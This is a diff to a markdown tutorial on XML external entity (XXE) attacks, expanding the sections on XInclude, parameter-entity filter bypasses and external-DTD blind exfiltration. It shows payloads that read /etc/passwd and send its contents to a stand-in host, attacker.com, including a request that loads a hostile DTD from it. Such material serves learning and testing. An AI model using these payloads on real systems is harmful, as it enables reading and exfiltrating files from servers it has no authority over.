@@ -125,23 +125,40 @@ _Goal:_ Confirm vulnerability via DNS/HTTP interaction.
 
 ### 4️⃣ XInclude Attacks
 
-When you cannot modify the `DOCTYPE` (e.g., the input is just a fragment), you can use `XInclude`.
+**The Scenario:** Sometimes, you are injecting into a data field (like a SOAP body or a specific XML tag) where you have no control over the `DOCTYPE` declaration at the top of the file. Without a `DOCTYPE`, you cannot define new entities.
 
+**The Mechanism:**
+Instead of defining a custom entity, we abuse a standard XML feature called **XInclude**. This is a specification designed to build large XML documents from multiple smaller files.
 
+* **How it works:** You introduce the XInclude namespace (`xmlns:xi`) into any tag you control. This gives you access to the special `<xi:include>` element.
+* **The Parsing Logic:** When the parser encounters this element, it sees the `href` attribute, fetches the file (just like a `SYSTEM` entity would), and replaces the element with the file's contents.
+
+**The Payload:**
 
 ```
 <foo xmlns:xi="[http://www.w3.org/2001/XInclude](http://www.w3.org/2001/XInclude)">
 <xi:include parse="text" href="file:///etc/passwd"/>
 </foo>
 ```
+xmlns:xi: Tells the parser "I am using the XInclude standard."
+parse="text": Crucial for file reading; it tells the parser "Treat the included file as plain text, not valid XML" (preventing syntax errors if the target file contains characters like < or &).
+
 
 _Goal:_ Inject external content without defining a DTD.
 
 ### 5️⃣ Parameter Entities (Bypassing Filters)
 
-If the parser blocks regular entities in the body, we use **Parameter Entities** (`%name;`) inside the DTD itself.
+**The Scenario:** You try to inject a standard entity like `&xxe;`, but the application blocks it. This is often because a WAF (Web Application Firewall) or input filter is specifically looking for the `&...;` syntax in the document body.
 
+**The Mechanism:** XML has two types of entities:
 
+1. **General Entities (`&name;`):** Used in the document **body**.
+    
+2. **Parameter Entities (`%name;`):** Used exclusively **inside the DTD**.
+    
+**Why it works:** Filters often overlook the `%` character. By using Parameter Entities, you can execute your payload entirely within the DTD (the "header" of the XML) without ever placing a dangerous `&` character in the visible data fields.
+
+**The Payload:**
 
 ```
 <!ENTITY % file SYSTEM "file:///etc/passwd">
@@ -152,9 +169,29 @@ If the parser blocks regular entities in the body, we use **Parameter Entities**
 
 _Goal:_ OOB exfiltration when basic entities are blocked.
 
+
 ### 6️⃣ The External DTD (Bypassing Parser Restrictions)
 
-Sometimes, parsers block Parameter Entities in the _Internal Subset_. To bypass this, we move the malicious logic to an **External DTD** hosted on our server.
+**The Scenario:** You are trying to exfiltrate data out-of-band (Blind XXE). You try to write a complex entity that joins the URL with the file content: `<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?x=%file;'>">`
+
+However, the server errors out with: _"Parameter entities are not allowed in the internal subset."_
+
+**The Mechanism:** This is a standard XML parser rule. It forbids "fancy" entity manipulation (like nesting one entity inside another's definition) inside the main document (the **Internal Subset**).
+
+However, this rule does **not** apply to external files (the **External Subset**).
+
+**The Bypass:**
+
+1. We move the complex, forbidden logic into a separate file (`xxe.dtd`) hosted on our own server.
+    
+2. Inside our request to the victim, we simply load that file.
+    
+3. Once the parser loads the external file, it switches context to the "External Subset," where the restrictive rules disappear. This allows us to join strings and stack entities to exfiltrate data.
+    
+
+**The Payload Flow:**
+1. **Victim Request:** `<!ENTITY % load SYSTEM "http://attacker.com/xxe.dtd"> %load;`
+2. **Attacker File (`xxe.dtd`):** Contains the "illegal" nested logic to read `/etc/passwd` and append it to a URL string.
 
 **The Malicious File (`xxe.dtd`):**
 
